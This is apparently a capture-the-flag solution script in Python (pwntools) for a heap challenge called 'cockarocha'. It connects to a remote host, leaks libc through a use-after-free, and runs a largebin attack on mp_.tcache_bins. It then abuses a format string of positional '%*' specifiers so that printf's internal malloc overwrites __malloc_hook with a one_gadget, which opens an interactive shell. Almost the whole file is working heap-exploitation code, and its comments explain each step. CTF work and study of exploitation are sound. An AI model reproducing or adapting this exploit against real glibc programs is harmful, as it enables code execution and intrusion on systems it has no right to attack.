from pwn import *

#init

e = ELF('./cockarocha')
libc = ELF('./libcs-2.31.so')

#p = process(e.path)
p = remote('159.89.254.233', 31783)

#funcs

def add(x, y):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', str(y))

def fre(x, t = False):
    p.sendlineafter('?', '2')
    p.sendlineafter('?', str(x))
    p.sendlineafter('(y/N)', 'n' if t else 'y')

def rd(x):
    p.sendlineafter('?', '3')
    p.sendlineafter('?', str(x))
    p.recvuntil(':\n')
    return p.recvline(keepends = False)

def chg(x, y, s = b''):
    p.sendlineafter('?', '4')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', str(y))
    p.sendlineafter(':', s)

def ex():
    p.sendlineafter('?', '5')

#vars

arena_off = libc.sym['main_arena']
mp_off = libc.sym['mp_']
mallochook_off = libc.sym['__malloc_hook']
onegadget_off = 0xe6d60

log.info('Arena libc off: ' + hex(arena_off))
log.info('Mp libc off: ' + hex(mp_off))
log.info('Mallochook libc off: ' + hex(mallochook_off))
log.info('Onegadget libc off: ' + hex(onegadget_off))

#exploit

#start setup largbin attack while also leaving room for fake fmtstr and tcache indices

add(0, 0x527 + 0xa020)
add(1, 0x507)
add(2, 0x517)
add(3, 0x507)

fre(0, True)

#get libc off from uaf on chnk 0

libc_off = u64(rd(0).ljust(8, b'\x00')) - arena_off - 0x60

log.info('Libc off adr: ' + hex(libc_off))

#continue largebin attack setup and add the extra room chunk


add(4, 0xa017) #this is chnk used for room which moves unsorted forward
add(5, 0x537)

fre(2)

#overwrite chnk data on uaf as fmtstr entry, fake tcache entries, and address for largebin attack 
#printf will be called which internally will have heap action if position formatters are used
#first launch largebin attack on mp_.tcache_bins causing large chnks to be treated as tcache
#then printf internally calls malloc and use fake tcache entry tocopy onegadget onto freehook
#onegadget is stored on stack when you enter 0/1 for if you are sure you want to dance
#finally cause printf to call malloc one more time by using star operator

#fmtstr data

s = b''
for i in range(0x1, 0x400):
    s += b'%*' + str(i).encode() + b'$p'

#tcache data

#s = s.ljust(0x9d8, b'\x00')
#s += p64(libc_off + mallochook_off - 0xe * 8)

s += b'\x00' * (8 - len(s) % 8)
s += p64(libc_off + mallochook_off - 0xe * 8) * ((0xa018 - len(s)) // 8)

#largebin data

s = s.ljust(0xa018, b'\x00')
s += p64(0x531)
s += p64(libc_off + arena_off + 0x490) * 2
s += b'a' * 0x8
s += p64(libc_off + mp_off + 0x50 - 0x20)
#gdb.attach(p)
chg(libc_off + onegadget_off, 0, s)

#pray for flag

p.interactive()
